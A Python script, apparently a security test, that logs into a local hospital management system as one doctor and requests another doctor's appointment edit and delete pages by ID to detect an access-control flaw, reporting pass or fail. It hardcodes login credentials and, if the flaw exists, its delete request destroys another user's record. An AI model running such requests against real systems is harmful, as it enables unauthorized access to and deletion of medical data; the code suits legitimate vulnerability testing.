import requests, re, sys
from bs4 import BeautifulSoup

BASE = "http://localhost/hms/"
LOGIN_URL = f"{BASE}index.php?/login"
EDIT_URL = f"{BASE}index.php?/doctor/manage_appointment/edit/{{}}"
DELETE_URL = f"{BASE}index.php?/doctor/manage_appointment/delete/{{}}"

ATTACKER = {
    "login_type": "doctor",
    "email": "Rizwan@yahoo.com",
    "password": "rizwan123"
}
OWN_ID = 31
VICTIM_ID = 47
MARKER = "MARK_D06_X"

def get_token(session):
    resp = session.get(LOGIN_URL, timeout=10)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")
    token_tag = soup.find("input", {"name": "authenticity_token"})
    if not token_tag or not token_tag.has_attr("value"):
        sys.exit("Failed to locate authenticity_token")
    return token_tag["value"]

def login(session):
    token = get_token(session)
    payload = {
        "login_type": ATTACKER["login_type"],
        "email": ATTACKER["email"],
        "password": ATTACKER["password"],
        "authenticity_token": token
    }
    resp = session.post(LOGIN_URL, data=payload, timeout=10)
    resp.raise_for_status()
    if 'name="login_type"' in resp.text:
        sys.exit("Login failed")
    return resp

def check_marker(text):
    return MARKER in text

def test_endpoint(session, name, url_template):
    # baseline (own resource) – just to ensure request works, ignore marker
    own_url = url_template.format(OWN_ID)
    resp_own = session.get(own_url, timeout=10)
    resp_own.raise_for_status()

    # attack (victim resource)
    victim_url = url_template.format(VICTIM_ID)
    resp_victim = session.get(victim_url, timeout=10)
    resp_victim.raise_for_status()

    allowed = check_marker(resp_victim.text)
    if allowed:
        print(f"{name} appointment ID {VICTIM_ID}: FAIL - access allowed (marker found)")
    else:
        print(f"{name} appointment ID {VICTIM_ID}: PASS - access denied (marker not found)")

def main():
    sess = requests.Session()
    login(sess)

    test_endpoint(sess, "Edit", EDIT_URL)
    test_endpoint(sess, "Delete", DELETE_URL)

if __name__ == "__main__":
    main()